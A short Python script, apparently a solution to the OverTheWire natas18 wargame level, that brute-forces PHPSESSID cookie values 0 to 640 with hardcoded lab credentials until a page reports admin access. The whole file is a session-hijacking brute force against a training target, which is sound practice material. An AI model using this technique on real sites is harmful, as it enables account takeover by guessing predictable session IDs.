import requests 

for session_id in range(641):
        
    print("Trying session_id: " + str(session_id));
    response = requests.get('http://natas18.natas.labs.overthewire.org', auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'), cookies = {'PHPSESSID': str(session_id)})
    
    if ("You are an admin." in response.text):
        print(response.text);
        break;
        